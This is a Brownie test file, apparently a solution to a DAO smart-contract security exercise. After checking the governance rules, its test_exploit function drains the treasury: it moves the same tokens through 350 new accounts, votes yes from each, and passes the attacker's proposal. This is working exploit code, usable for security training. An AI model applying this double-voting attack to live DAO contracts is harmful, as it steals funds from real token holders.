from scripts.dao2_helper import *
from brownie import reverts
import pytest

#@pytest.fixture
def governance():
    with reverts("You don't have voting power"):
        dao.propose(user, ETH_IN_TREASURY, {'from': user, 'gas_price': 0x4133110a0})

    # Depoyer proposes 2 proposals
    dao.propose(deployer, FIRST_PROPOSAL_AMOUNT)
    dao.propose(deployer, SECOND_PROPOSAL_AMOUNT)

    # Random user can't vote
    with reverts():
        dao.vote(1, False, {'from': user, 'gas_price': 0x4133110a0})
    # DAO Members can vote
    # First proposal should go through (Yes - 2500, No - 1000)
    dao.vote(1, True, {'from': daoMember1, 'gas_price': 0x4133110a0})

    # Can't vote twice on same proposal
    with reverts():
        dao.vote(1, False, {'from': daoMember1, 'gas_price': 0x4133110a0})
    dao.vote(1, False, {'from': daoMember2, 'gas_price': 0x4133110a0})

    # Second proposal should fail (Yes - 1500, No - 2000)
    dao.vote(2, False, {'from': daoMember1, 'gas_price': 0x4133110a0})
    dao.vote(2, False, {'from': daoMember2, 'gas_price': 0x4133110a0})

    # Can't execute before voting is over
    with reverts("Voting is not over"):
        dao.execute(1)

    # Advance time 1 day so we can try proposal execution
    w3.provider.make_request( "evm_increaseTime", [1 * 24 * 60 * 60])
    #chain.mine()

    # First proposal should succeed - treasury balance changed
    dao.execute(1)
    treasuryBalanceAfterFirstProposal = ETH_IN_TREASURY - FIRST_PROPOSAL_AMOUNT
    assert(treasury.balance() == treasuryBalanceAfterFirstProposal)

    # Second proposal should fail - treasury balance unchanged
    dao.execute(2)
    assert(treasury.balance() == treasuryBalanceAfterFirstProposal)

    # Both proposal processed
    proposal1 = dao.getProposal(1)
    proposal2 = dao.getProposal(2)
    assert(proposal1['processed'] == True)
    assert(proposal2['processed'] == True)

    # Can't execute processed proposal
    with reverts("Proposl already processed"):
        dao.execute(2)

    return treasuryBalanceAfterFirstProposal

def test_exploit():
    treasuryBalanceAfterFirstProposal = governance()
    #treasuryBalanceAfterFirstProposal = ETH_IN_TREASURY - FIRST_PROPOSAL_AMOUNT

    # We need more than 3500 votes
    # We own 10 tokens
    # Vote from 350 signers --> 3510 yes
    dao.propose(attacker, treasuryBalanceAfterFirstProposal, {'from': attacker})
    currentSigner = attacker
    
    for _ in range(0, 350):
        # Create a new random signer
        nextsigner = accounts.add()

        # Transfer tokens to the new signer
        dao.transfer(nextsigner, ATTACKER_TOKENS, {'from': currentSigner})

        # Vote yes from the new signer
        attacker.transfer(nextsigner, Wei('0.05 ether'))
        dao.vote(3, True, {'from': nextsigner})
        currentSigner = nextsigner

    # Other DAO Members vote "no" on the attacker's proposal
    txs = (Wei('0.05 ether')* 350) # 350 votes 

    dao.vote(3, False)
    dao.vote(3, False, {'from': daoMember1})
    dao.vote(3, False, {'from': daoMember2})

    # Fast forward EVM 1 day so proposal can be executed
    w3.provider.make_request( "evm_increaseTime", [1 * 24 * 60 * 60])

    # Attacker is trying to execute proposal
    dao.execute(3, {'from': attacker})
        
    # No ETH left in treasury
    assert(treasury.balance() == 0)

    # Attacker has all the ETH
    assert(attacker.balance() == attackerInitialETHBalance + treasuryBalanceAfterFirstProposal - txs)